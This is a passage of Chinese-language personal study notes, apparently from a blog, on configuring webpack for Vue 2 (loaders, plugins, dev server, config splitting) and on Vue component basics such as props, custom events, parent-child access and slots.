/(node_modules|bower_components)/, use: &#123; loader: &#x27;babel-loader&#x27;, options: &#123; presets: [&#x27;es2015&#x27;] &#125; &#125; &#125; 这样的话 打包好的js 就没有es6属性了 2.6 webpack中配置Vue 2.6.1 引入vue.js 要在项目中使用Vue.js，就需要对其产生依赖，所以先安装 12npm install vue --save //因为后续在实际项目中会使用到vue，所以并不是开发时依赖的//当时是 vue@2.5.21 我的是vue@2.6.12 会被安装到 node_modules里 就可以把vue当成一个模块 然后在任何一个文件就可以引用 vue 1234//main.js//5.使用Vue.js开发import Vue from &#x27;vue&#x27; //没有文件名 就会在 上述包里 找vue 编写-&gt; 打包 -&gt; 打开 -&gt; 报错 原因： vue有两个版本 ： runtime-only 代码中不能有任何的template 不会编译 runtime-complier 可以编译template 报的错就是 因为使用的就是runtime-only版本 解决： 修改webpack的配置 添加： 12345678910//webpack.config.js //与entry同级 resolve: &#123; //别名 alias: &#123; //在进行 import Vue from &#x27;vue 操作时 会看vue是否指向 下面的文件夹 &#x27;vue$&#x27;: &#x27;vue/dist/vue.esm.js&#x27; &#125; &#125;, 重新打包 -&gt;运行就可以了 2.6.2 el和template的区别（一） 因为后面开发 只用一个index.html 在使用组件时 就必要的会修改index.html 但html模板在之后的开发中，不希望手动来频繁修改 所以 123456&lt;!-- 在html中只保留这个代码 --&gt;&lt;body&gt; &lt;div id=&quot;app&quot;&gt; &lt;/div&gt; &lt;script src=&quot;./dist/bundle.js&quot;&gt;&lt;/script&gt;&lt;/body&gt; 123456789//在vue实例中 使用template template会替换掉 el挂载的元素const app = new Vue(&#123; el: &quot;#app&quot;, template: `&lt;div&gt;&lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt;&lt;/div&gt;`, data: &#123; message: &#x27;hello webpack!&#x27; &#125;&#125;) 2.6.3 完善 将上述 抽取到组件中： 123456789101112131415161718192021222324252627const App = &#123; template: ` &lt;div&gt; &lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt; &lt;button @click=&#x27;butClick&#x27;&gt;按钮&lt;/button&gt; &lt;/div&gt; `, data() &#123; return &#123; message: &#x27;hello webpack!&#x27; &#125; &#125;, methods: &#123; btnClick() &#123; alert(); &#125; &#125;&#125; new Vue(&#123; el: &quot;#app&quot;, template: &#x27;&lt;App /&gt;&#x27;, components: &#123; App &#125;, data: &#123;&#125;&#125;) 抽取对象 1234567891011121314151617181920//App.jsexport default &#123; template: ` &lt;div&gt; &lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt; &lt;button @click=&#x27;butClick&#x27;&gt;按钮&lt;/button&gt; &lt;/div&gt; `, data() &#123; return &#123; message: &#x27;hello webpack!&#x27; &#125; &#125;, methods: &#123; btnClick() &#123; alert(); &#125; &#125;&#125; 1234567891011121314//main.js//5.使用Vue进行开发import Vue from &#x27;vue&#x27;import App from &#x27;./vue/app&#x27; //默认导出 不需要大括号new Vue(&#123; el: &quot;#app&quot;, template: &#x27;&lt;App /&gt;&#x27;, components: &#123; App &#125;, data: &#123;&#125;&#125;) 分离app.js 的js与模板 123456789101112131415161718192021222324252627282930//app.vue&lt;template&gt; &lt;div class=&quot;title&quot;&gt; &lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt; &lt;button @click=&quot;butClick&quot;&gt;按钮&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;App&quot;, data() &#123; return &#123; message: &quot;hello webpack!&quot;, &#125;; &#125;, methods: &#123; btnClick() &#123; alert(); &#125;, &#125;,&#125;;&lt;/script&gt;&lt;style scoped&gt;.title &#123; color: red;&#125;&lt;/style&gt; 12345678910111213141516//main.js//5.使用Vue进行开发import Vue from &#x27;vue&#x27;// import App from &#x27;./vue/app&#x27;import App from &#x27;./vue/app.vue&#x27;new Vue(&#123; el: &quot;#app&quot;, template: &#x27;&lt;App /&gt;&#x27;, components: &#123; App &#125;, data: &#123;&#125;&#125;) 运行后 会报错 因为使用了.vue文件 要配loader 配置vue-loader 12345678//安装 vue-loader vue-template-compilernpm install vue-loader vue-template-compiler --save-dev//webpack.config.js配置文件&#123; test:/\\.vue$/, use:[&#x27;vue-loader&#x27;]&#125; 报错的话 可能是vue-loader版本太高 可以修改低于14的版本 ‘^13.0.0’ 然后再终端 npm install 重新下载 然后就可以了 组件化使用 123456789101112131415161718192021//Cpn.vue&lt;template&gt; &lt;div&gt; &lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;Cpn&quot;, data() &#123; return &#123; message: &quot;Cpn组件&quot;, &#125;; &#125;,&#125;;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 1234567891011121314151617181920212223242526272829303132333435363738//app.vue//import Cpn from &quot;./Cpn.vue&quot;;//注册 组件 compontents: &#123;Cpn,&#125;,//使用组件 单/双标签 都可 &lt;Cpn&gt;&lt;/Cpn&gt;&lt;template&gt; &lt;div class=&quot;title&quot;&gt; &lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt; &lt;button @click=&quot;butClick&quot;&gt;按钮&lt;/button&gt; &lt;Cpn&gt;&lt;/Cpn&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import Cpn from &quot;./Cpn.vue&quot;; export default &#123; name: &quot;App&quot;, components: &#123; Cpn, &#125;, data() &#123; return &#123; message: &quot;hello webpack!&quot;, &#125;; &#125;, methods: &#123; btnClick() &#123; alert(); &#125;, &#125;,&#125;;&lt;/script&gt;&lt;style scoped&gt;.title &#123; color: green;&#125;&lt;/style&gt; 如果在 import 时想要简写 .vue 什么的 可以在 webpack.config.js 的 resolve添加 12//webpack.config.js extensions:[&#x27;.js&#x27;,&#x27;.vue&#x27;,&#x27;.css&#x27;] 2.7 横幅plugin的使用 认识plugin plugin是插件的意思，通常是用于对某个现有的架构进行扩展 webpack中的插件，就是对webpack现有功能的各种扩展 loader和plugin区别 loader主要用于转换某些类型的模块，转换器 plugin是插件，是对webpack本身的扩展，扩展器 plugin的使用过程 步骤一：通过npm安装需要使用的plugins 步骤二：在webpack.config.js中的plugins中配置文件 2.7.1 添加版权的plugin 该插件名字BannerPlugin,属于webpack自带的插件 12345678910111213//webpack.config.js//添加版权的Pluginconst webpack = require(&#x27;webpack&#x27;);module.exports=&#123; ... plugins: [ new webpack.BannerPlugin(&#x27;最终版权归lsy所有&#x27;) ]&#125;//进入相应的文件夹 运行 能在 打好包的文件第一行看见 /*! 最终版权归lsy所有 */ 2.7.2 打包html的plugin 在开发时，index.html文件是存放在项目根目录下的，但真实发布时，发布的是dist的内容，但是dist没有index.html时，打包文件也就没有意义 所以需要将html打包到dist中，这时就能用HtmlWebpackPlugin插件 HtmlWebpackPlugin插件可以： 自动生成的一个index.html文件 可以指定模板来生成 将打包的js文件自动通过script标签插入到body 安装HtmlWebpackPlugin插件： 1npm install html-webpack-plugin@3.2.0 --save-dev //老师是@3.2.0 修改配置webpack.config.js文件中plugins部分： 这里的template表示根据什么模板来生成index.html 需要删除之前在output中添加的publicPath属性 否则插入script标签中的src可能会有问题 123456789101112//webpack.config.js//添加打包html的pluginconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;); plugins: [ //添加版权 new webpack.BannerPlugin(&#x27;最终版权归lsy所有&#x27;), //打包html new HtmlWebpackPlugin() ] 运行 发现 在dist中 有index文件： 没有必须的&lt;div id='app'&gt;&lt;/div&gt; 建立一个模板 原来的index 即根目录下的index body里只留下 上述代码作为模板 1234&lt;body&gt; &lt;div id=&quot;app&quot;&gt; &lt;/div&gt;&lt;/body&gt; 再在打包的地方 引入模板 123new HtmlWebpackPlugin(&#123; template: &#x27;index.html&#x27;&#125;) src的地址有错 在webpack.config.js 中注释掉 publicPath: ‘dist/’ 再运行就可以了 2.7.3 js压缩的Plugin（发布阶段使用） 在项目发布之前，必然要队js等文件进行压缩处理 使用第三方插件uglifyjs-webpack-plugin，并且指定版本号，与CLI2保持一致 1npm install uglifyjs-webpack-plugin@1.1.1 --save-dev 修改配置文件 123456789101112131415//webpack.config.js//添加压缩js的pluginconst UglifyjsWebpackPlugin = require(&#x27;uglifyjs-webpack-plugin&#x27;); plugins: [ //添加版权 new webpack.BannerPlugin(&#x27;最终版权归lsy所有&#x27;), //打包html new HtmlWebpackPlugin(&#123; template: &#x27;index.html&#x27; &#125;), //压缩js文件 new UglifyjsWebpackPlugin() ] 但在开发时不建议使用 因为不方便调试代码 在发布阶段 再加进来 2.8 搭建本地服务器（开发阶段使用） webpack提供了一个可选的本地开发服务器，这个服务器基于node.js搭建，内部使用express框架，可以实现让浏览器自动刷新显示修改后的结果 安装 1npm install --save-dev webpack-dev-server@2.9.1 devserver也是作为webpack中的一个选项，选项本身可以设置如下属性： contentBase：为哪一个文件夹提供本地服务，默认是根文件夹，这里填写./dist port：端口号 inline：页面实时刷新 historyApiFallback：在SPA页面中，依赖HTML5的history模式 配置webpack.config.js文件的配置 1234567//webpack.config.js 与pulgin同级 //搭建本地服务器 devServer: &#123; contentBase: &#x27;./dist&#x27;, inline: true, //是否实时监听 &#125; 跑起来 是通过 webpack-dev-server 因为是再局部安装的 所以跑起来 说找不到命令 所以在终端 应该找本地的 ./node_modules/.bin/webpack-dev-server 但是有更简洁的方式： 1234567//package.json&quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;build&quot;: &quot;webpack&quot;, &quot;dev&quot;: &quot;webpack-dev-server&quot; &#125;, 终端输入npm run dev 就会出现本地可以运行的地址 点进去 后修改代码 进去就会发现 页面也刷新了 停止服务 ：ctrl + c 停止服务后 可以再次打包 就可以了 因为手动点地址进去可能有点麻烦 ，所以 &quot;dev&quot;: &quot;webpack-dev-server --open&quot; 就会自动打开了 2.9 配置文件的分离 因为有些是开发时需要 有些是发布时需要 开发： 12345678module.exports = &#123; //搭建本地服务器 devServer: &#123; contentBase: &#x27;./dist&#x27;, inline: true, //是否实时监听 &#125;&#125; 生产时： 1234567891011//添加压缩js的pluginconst UglifyjsWebpackPlugin = require(&#x27;uglifyjs-webpack-plugin&#x27;);module.exports = &#123; plugins: [ //压缩js文件 new UglifyjsWebpackPlugin() ],&#125; 安装webpack-merge 对两个文件进行合并 1npm install webpack-merge@4.1.5 --save-dev 合并文件 生产时： 123456789101112131415161718//生产时//添加压缩js的pluginconst UglifyjsWebpackPlugin = require(&#x27;uglifyjs-webpack-plugin&#x27;);//合并两个文件const webpackMerge = require(&#x27;webpack-merge&#x27;);//导入baseConfigconst baseConfig = require(&#x27;./base.config&#x27;);module.exports = webpackMerge(baseConfig, &#123; plugins: [ //压缩js文件 new UglifyjsWebpackPlugin() ],&#125;) 开发时： 12345678910111213141516//开发时//合并两个文件const webpackMerge = require(&#x27;webpack-merge&#x27;);//导入baseConfigconst baseConfig = require(&#x27;./base.config&#x27;);module.exports = webpackMerge(baseConfig, &#123; //搭建本地服务器 devServer: &#123; contentBase: &#x27;./dist&#x27;, inline: true, //是否实时监听 &#125;&#125;) 此时webpack.config.js就可以删了 然后运行的时候就会报错 说没有‘webpack.config,js’配置文件， 此时就需要在package.json中，指定要用的配置文件 1234567//webpack.json //手动指定执行文件 &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;build&quot;: &quot;webpack --config ./bulid/prod.config.js&quot;, &quot;dev&quot;: &quot;webpack-dev-server --open --config ./build/dev.config.js&quot; &#125;, 然后就发现 被打包到build文件夹下面 的dist中了 将路径改正确 123//原‘dist’ //../是因为后面使用了 build/base.config.jspath: path.resolve(__dirname, &#x27;../dist&#x27;),","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"webpack","slug":"webpack","permalink":"https://shylees.github.io/tags/webpack/"},{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"03 vue组件开发","slug":"vue/03 组件开发","date":"2021-03-11T16:00:00.000Z","updated":"2021-03-14T16:00:00.000Z","comments":false,"path":"learningNotes/vue/03 组件开发","link":"learningNotes/vue/03 组件开发","permalink":"https://shylees.github.io/learningNotes/vue/03%20%E7%BB%84%E4%BB%B6%E5%BC%80%E5%8F%91","excerpt":"","text":"1. 组件化 1.1 什么是组件化 将一个完整的页面分成很多个组件 每个组件都用于实现页面的一个功能块 每一个组件又可以进行细分 1.2 Vue组件化思想 组件化是Vue.js中的重要思想 它提供了一种抽象，让我们可以开发出一个个独立可复用的小组件来构造我们的应用 任何的应用都会被抽象成一颗组件树 组件化思想的应用 尽可能将页面拆分成一个个小的、可以复用的组件 使代码更方便组织和管理，扩展性也更强 1.3 注册组件的基本步骤 调用Vue.extend()创建组件构造器 调用Vue.component()注册组件 在Vue实例的作用范围内使用组件 2.组件化的基本使用 2.1 步骤解析 Vue.extend(): 调用Vue.extend()创建的是一个组件构造器 通常在创建组件构造器时，传入template代表我们自定义组件的模板 该模板就是在使用到组件的地方，要显示的html代码 事实上，这种写法在Vue2.x的文档已经看不到了，会直接使用语法糖的形式 Vue.component(): 调用Vue.component()是将刚才的组件构造器注册为一个组件，并且给起一个组件的标签名称 需要传递两个参数：1. 注册组件的标签名 2. 组件构造器 组件必须挂载在某个Vue实例下，否则不会生效 2.2 代码演示 12345678910111213141516171819202122232425&lt;div id=&quot;app&quot;&gt; &lt;!-- 3.使用组件 --&gt; &lt;my-cpn&gt;&lt;/my-cpn&gt;&lt;/div&gt;&lt;script&gt; //1.创建组件构造器对象 如果有多个标签的话 需要有一个根 const cpnC = Vue.extend(&#123; template:` &lt;div&gt; &lt;h2&gt;我是标题&lt;/h2&gt; &lt;p&gt;我是内容&lt;/p&gt; &lt;/div&gt;` &#125;) //2.注册组件 Vue.component(&#x27;my-cpn&#x27;,cpnC); //new Vue不能写在前面 const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27; &#125; &#125;)&lt;/script&gt; 3.全局组件和局部组件 全局组件：可以在多个Vue实例下面使用；通过Vue.component()注册的组件 局部组件：只能在当前Vue实例下使用；注册的组件时挂载在某个实例中 12345678910Vue.component(&#x27;cpn&#x27;,cpnC); //2.注册组件，全局组件const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123;&#125;, components:&#123; //局部组件 用的比较多 //cpn使用组件时的标签名 cpn:cpnC; &#125;&#125;) 4.父组件和子组件 组件之间存在层级关系 其中一种非常重要的关系就是父子组件的关系 1234567891011121314151617181920212223242526272829303132333435363738&lt;div id=&quot;app&quot;&gt; &lt;cpn2&gt;&lt;/cpn2&gt; &lt;!-- &lt;cpn1&gt;&lt;/cpn1&gt; 如果要使用这个组件 要在全局或者在Vue实例注册组件 --&gt;&lt;/div&gt;&lt;script&gt; //1.创建第一个组件构造器（子组件） const cpnC1 = Vue.extend(&#123; template:` &lt;div&gt; &lt;h2&gt;标题1&lt;/h2&gt; &lt;/div&gt; ` &#125;) //2.创建第二个组件构造器（父组件） const cpnC1 = Vue.extend(&#123; template:` &lt;div&gt; &lt;h2&gt;标题2&lt;/h2&gt; &lt;cpn1&gt;&lt;/cpn1&gt; &lt;/div&gt; `, components:&#123; cpn1:cpnC1; &#125; &#125;) //root 组件 const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27;, &#125;, compontents:&#123; cpn2:cpnC2 &#125; &#125;)&lt;/script&gt; 5. 组件语法糖 主要是省去了调用Vue.extend()的步骤，可以直接使用一个对象来代替 1234567891011121314151617181920212223//1.全局组件注册的语法糖Vue.component(&#x27;cpn1&#x27;,&#123; template:` &lt;div&gt; &lt;h2&gt;标题1&lt;/h2&gt; &lt;/div&gt; `&#125;)//2.局部组件注册const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123;&#125;, temponents:&#123; &#x27;cpn2&#x27;:&#123; template:` &lt;div&gt; &lt;h2&gt;标题2&lt;/h2&gt; &lt;/div&gt; `, &#125; &#125;&#125;) 6.组件模板抽离的写法 Vue提供了两种方案来定义HTML模块内容： 使用标签 :type=“text/x-template” 使用标签 12345678910111213141516171819202122232425262728293031&lt;div id=&quot;app&quot;&gt; &lt;cpn&gt;&lt;/cpn&gt;&lt;/div&gt;&lt;!-- 1.使用&lt;script&gt;标签 --&gt;&lt;script type=&quot;text/x-template&quot; id=&quot;cpn&quot;&gt; &lt;div&gt; &lt;h2&gt;标题1&lt;/h2&gt; &lt;/div&gt;&lt;/script&gt;&lt;!-- 2.使用&lt;template&gt;标签 --&gt;&lt;template id = &quot;cpn&quot;&gt; &lt;div&gt; &lt;h2&gt;标题2&lt;/h2&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;//1.注册一个全局组件 Vue.comonent(&#x27;cpn&#x27;,&#123; template:&#x27;#cpn&#x27; &#125;) const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27;, &#125; &#125;)&lt;/script&gt; 7.组件数据存放的问题 7.1 用法 组件是一个单独功能模块的封装： 这个模块又属于自己的HTML模板，也应该有属于自己的数据data 组件的数据不能保存再顶层Vue实例中 组件对象也有一个data属性（也可以有methods等属性） 只是这个data属性必须是一个函数 而且这个函数返回一个对象，对象内部保存着数据 12345678910111213141516171819202122232425262728&lt;div id=&quot;#app&quot;&gt; &lt;my-cpn&gt;&lt;/my-cpn&gt;&lt;/div&gt;&lt;template id=&quot;cpn&quot;&gt; &lt;div&gt;&lt;h2&gt; &#123;&#123;title&#125;&#125; &lt;/h2&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt; //1.注册全局组件 Vue.component(&#x27;cpn&#x27;,&#123; template:&quot;#cpn&quot;, data()&#123; return &#123; title:&#x27;abc&#x27; &#125; &#125; &#125;) const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27; &#125; &#125;)&lt;/script&gt; 7.2 ！组件中的data为什么是函数（p58） 为了传值不传址，使用函数时组件与组件之间的数据不会相互影响 8.父子组件的通信 在开发中，往往一些数据需要从上层传递到下层 比如在一个页面中，我们从服务器请求到了很多的数据 其中一部分数据，并非是我们整个页面的大组件来展示的，而是需要下面的子组件进行展示 这个时候，并不会让子组件再次发送一个网络请求，而是让大组件将数据传递给小组件 如何进行父子/大小组件间的通信呢?Vue官方提到 通过props向子组件传递数据 通过自定义事件$emit向父组件发送消息 8.1 props基本用法——父–&gt;子 在组件中，使用选项props来声明需要从父级接收到的数据 props的值有两种方式： 字符串数组，数组的字符串就是传递时的名称 对象，对象可以设置传递时的类型，也可以设置默认值等 123456789101112131415161718192021222324252627282930313233343536&lt;div id=&#x27;app&#x27;&gt; &lt;cpn v-bind:cmovies=&quot;movies&quot; :cmessage=&quot;message&quot;&gt;&lt;/cpn&gt; &lt;!-- 这就已经把值从父组件传到子组件了 必须要使用v-bind --&gt;&lt;/div&gt;&lt;template id=&quot;cpn&quot;&gt; &lt;div&gt; &lt;p v-for=&quot;item in cmovies&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/p&gt; &lt;h2&gt;&#123;&#123;cmessage&#125;&#125;&lt;/h2&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; //父传子:props const cpn = &#123; template:&quot;#cpn&quot;, props:[&#x27;comvies&#x27;,&#x27;cmessage&#x27;], data()&#123; return&#123;&#125; &#125;, methods:&#123; &#125; &#125; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27;, movies:[&#x27;海王&#x27;,&#x27;海贼王&#x27;,&#x27;海尔兄弟&#x27;] &#125;, components:&#123; cpn &#125; &#125;)&lt;/script&gt; 8.1.1 props数据验证 上述props选项使用一个数组 除数组外，可以使用对象，当需要对props进行类型等验证时，就需要对象写法了 验证支持的数据类型： String、Number、Boolean、Array、Object、Date、Function、Symbol 若有自定义构造函数时，验证也支持自定义的类型 12345678910111213141516171819202122232425262728293031323334const cpn = &#123; template:&quot;#cpn&quot;, //数组形式 props:[&#x27;comvies&#x27;,&#x27;cmessage&#x27;], //字符串形式 props:&#123; //1.类型限制 cmovies:Array, cmessage:String, //2.提供一些默认值 默认值在没有传递的时候会显示 v-bind没有传时 //required 为true时 说明这个属性是必传的 否则会报错 cmessage:&#123; type:String, default:&#x27;aaaa&#x27; required:true &#125; //类型是对象/数组时，默认值必须是一个函数 cmovies:&#123; type:Array, //default:[] 这样会报错 default()&#123; return [] &#125; &#125; &#125;, data()&#123; return&#123;&#125; &#125;, methods:&#123; &#125;&#125; 8.1.2 props驼峰标识 在组件的应用不适合用驼峰 应该要用- 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;div id=&quot;app&quot;&gt; &lt;!-- 在组件的应用不适合用驼峰 应该要用- --&gt; &lt;cpn :c-info=&quot;info&quot; :chile-my-message=&quot;message&quot;&gt;&lt;/cpn&gt;&lt;/div&gt;&lt;template id=&#x27;cpn&#x27;&gt; &lt;div&gt; &lt;h2&gt;&#123;&#123;cInfo&#125;&#125;&lt;/h2&gt; &lt;p&gt;&#123;&#123;chileMyMessage&#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; const cpn = &#123; template :&quot;#cpn&quot;, props:&#123; cInfo:&#123; type:Object, default()&#123; return &#123;&#125; &#125; &#125; &#125;, childMyMessage:&#123; type:String, default:&#x27;&#x27; &#125; &#125; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; info:&#123; name:&quot;why&quot;, age:18, height:1.88 &#125;, message:&#x27;hello&#x27; &#125;, components:&#123; cpn &#125; &#125;)&lt;/script&gt; 8.2 子传父 如果需要子组件传递数据或事件到父组件中：应该使用自定义事件来完成 什么时候需要定义事件？ 当子组件需要向父组件传递数据时，就要用到自定义事件 v-on可以用来监听自定义事件 自定义事件的流程 在子组件中，通过$emit()来触发事件 在父组件中，通过v-on来监听子组件事件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!-- 父组件模板 --&gt;&lt;div id=&quot;app&quot;&gt; &lt;!-- 不能使用驼峰 --&gt; &lt;cpn @itemclick=&quot;cpnClick&quot;&gt;&lt;/cpn&gt;&lt;/div&gt;&lt;!-- 子组件模板 --&gt;&lt;template id=&quot;cpn&quot;&gt; &lt;div&gt; &lt;button v-for=&quot;item in categories&quot; @click=&quot;btnClick(item)&quot;&gt;&#123;&#123;item.name&#125;&#125;&lt;/butto&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; //1.子组件 const cpn = &#123; template:&quot;#cpn&quot;, data()&#123; return &#123; categories:[ &#123;id:&#x27;aaa&#x27;,name:&#x27;热门推荐&#x27;&#125;, &#123;id:&#x27;bbb&#x27;,name:&#x27;手机数码&#x27;&#125;, &#123;id:&#x27;ccc&#x27;,name:&#x27;家用电器&#x27;&#125;, &#123;id:&#x27;ddd&#x27;,name:&#x27;电脑办公&#x27;&#125;, ] &#125; &#125;, methods:&#123; btnClick(item)&#123; //传给父组件 自定义事件 子组件 发射 this.$emit(&#x27;itemclick&#x27;,item); &#125; &#125; &#125; //2.父组件 const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27;, &#125;, components:&#123; cpn &#125;, methods:&#123; itemClick(item)&#123; console.log(&#x27;itemclick&#x27;,item); &#125; &#125; &#125;)&lt;/script&gt; 8.3 父子组件的访问方式 ： 有时候需要父组件直接访问子组件，子组件直接访问父组件，或者是子组件访问根组件 父组件访问子组件：是使用$children $refs 子组件访问父组件：使用$parent 8.3.1 父访问子 $children/$refs this.$children是一个数组类型，包含了所有的子组件对象 通过遍历，取出所有子组件的message状态 1. $children 因为返回的是数组的形式，所以如果要添加便签的话就很麻烦 所以一般开发不使用这样的方法 一般只有拿到所有子组件的信息的时候，才会使用$children 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;div id=&quot;app&quot;&gt; &lt;cpn&gt;&lt;/cpn&gt; &lt;cpn&gt;&lt;/cpn&gt; &lt;cpn&gt;&lt;/cpn&gt; &lt;button @click=&quot;btnClick&quot;&gt;按钮&lt;/button&gt;&lt;/div&gt;&lt;template id=&quot;cpn&quot;&gt; &lt;div&gt; 我是子组件 &lt;/div&gt;&lt;/template&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27;, &#125;, methods:&#123; btnClick()&#123; console.log(this.$children); //可以利用这个得到 子组件的各种属性 以数组的形式 this.$children[0].showMessage(); //然后调用 //if 有多个组件要渲染 for(let c of this.$children)&#123; console.log(c.name); &#125; &#125; &#125; components:&#123; cpn:&#123; template:&quot;#cpn&quot;, data()&#123; reutrn&#123; name:&#x27;我是子组件的name&#x27; &#125; &#125;, medthods:&#123; showMessage()&#123; console.log(&#x27;showMessage&#x27;); &#125; &#125; &#125; &#125; &#125;)&lt;/script&gt; 2.$refs 对象类型 默认空对象 必须在组件加 ref=‘aaa’ 一般都是使用这个属性 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;div id=&quot;app&quot;&gt; &lt;cpn&gt;&lt;/cpn&gt; &lt;cpn&gt;&lt;/cpn&gt; &lt;cpn ref=&#x27;aaa&#x27;&gt;&lt;/cpn&gt; &lt;button @click=&quot;btnClick&quot;&gt;按钮&lt;/button&gt;&lt;/div&gt;&lt;template id=&quot;cpn&quot;&gt; &lt;div&gt; 我是子组件 &lt;/div&gt;&lt;/template&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27;, &#125;, methods:&#123; btnClick()&#123; console.log(this.$refs); //如果没有在组件标签绑定 那返回空对象 若有绑定 就会返回有名字的对象 //名字会作为这个对象的key console.log(this.$refs.aaa); console.log(this.$refs.aaa.name); &#125; &#125; components:&#123; cpn:&#123; template:&quot;#cpn&quot;, data()&#123; reutrn&#123; name:&#x27;我是子组件的name&#x27; &#125; &#125;, medthods:&#123; showMessage()&#123; console.log(&#x27;showMessage&#x27;); &#125; &#125; &#125; &#125; &#125;)&lt;/script&gt; 8.3.2 子访问父$parent和 $root 用得很少，复用性不强 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;div id=&#x27;app&#x27;&gt; &lt;cpn&gt;&lt;/cpn&gt;&lt;/div&gt;&lt;template id=&#x27;cpn&#x27;&gt; &lt;ccpn&gt;&lt;/ccpn&gt;&lt;/template&gt;&lt;template id=&#x27;ccpn&#x27;&gt; &lt;div&gt; &lt;h2&gt;我是子组件&lt;/h2&gt; &lt;button @click=&#x27;btnClick&#x27;&gt;&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&quot;hello&quot;, &#125;, components:&#123; cpn:&#123; template:&quot;#cpn&quot;, data()&#123; return &#123; name:&#x27;我是cpn组件的name&#x27; &#125; &#125; &#125;, components:&#123; ccpn:&#123; template:&quot;#ccpn&quot;, methods:&#123; btnClick()&#123; //1.访问父组件$parent console.log(this.$parent); console.log(this.$parent.name); //2.访问根组件$root console.log(this.$root); console.log(this.$root.message); &#125; &#125; &#125; &#125; &#125; &#125;)&lt;/script&gt; 9.组件化高级（p69-72） 9.1插槽 slot 9.1 组件化插槽 slot为插槽的意思，目的是让我们原来的设备具有更多的扩展性 组件化插槽是为了让我们封装的组件更加具有扩展性 让使用者可以决定组件内部的一些内容到底展示什么 如何去封装以京东导航栏为例子的这类组件：抽取共性，保留不同 将共性抽取到组件中，将不同暴露为插槽 一旦预留了插槽，就可以让使用者根据自己的需求，决定插槽中插入什么内容 9.2 插槽的基本使用 基本使用 默认值 多个值时，会全部替换进去 12345678910111213141516171819202122232425262728&lt;div id=&#x27;#app&#x27;&gt; &lt;cpn&gt;&lt;/cpn&gt; &lt;cpn&gt; &lt;button&gt;按钮&lt;/button&gt; &lt;/cpn&gt; &lt;!-- 会把这个button放入插槽里 如果里面有多个 那也会全部显示出来 --&gt; &lt;cpn&gt;&lt;/cpn&gt;&lt;/div&gt;&lt;template id=&quot;cpn&quot;&gt; &lt;div&gt; &lt;h2&gt;我是组件&lt;/h2&gt; &lt;solt&gt;&lt;span&gt;如果没有传进想要的标签 就会默认显示插槽里的内容&lt;/span&gt;&lt;/solt&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27;, &#125;, components:&#123; cpn:&#123; template:&quot;#cpn&quot;, &#125; &#125; &#125;)&lt;/script&gt; 9.2 具名插槽slot 123456789101112131415161718192021222324252627282930&lt;div id=&#x27;#app&#x27;&gt; &lt;cpn&gt;&lt;/cpn&gt; &lt;cpn&gt; &lt;span solt=&quot;center&quot;&gt;标题&lt;/span&gt; &lt;!-- 如果没有加solt的属性 只会替换那些没有名字的插槽 --&gt; &lt;/cpn&gt; &lt;cpn&gt;&lt;/cpn&gt;&lt;/div&gt;&lt;template id=&quot;cpn&quot;&gt; &lt;div&gt; &lt;solt name=&#x27;left&#x27;&gt;&lt;span&gt;左边&lt;/span&gt;&lt;/solt&gt; &lt;solt name=&#x27;center&#x27;&gt;&lt;span&gt;中间&lt;/span&gt;&lt;/solt&gt; &lt;solt name=&#x27;right&#x27;&gt;&lt;span&gt;右边&lt;/span&gt;&lt;/solt&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27;, &#125;, components:&#123; cpn:&#123; template:&quot;#cpn&quot;, &#125; &#125; &#125;)&lt;/script&gt; 9.3 编译作用域 父组件模板的所有东西都会在父级作用域内编译；子组件模板的所有东西都会在子级作用域内编译 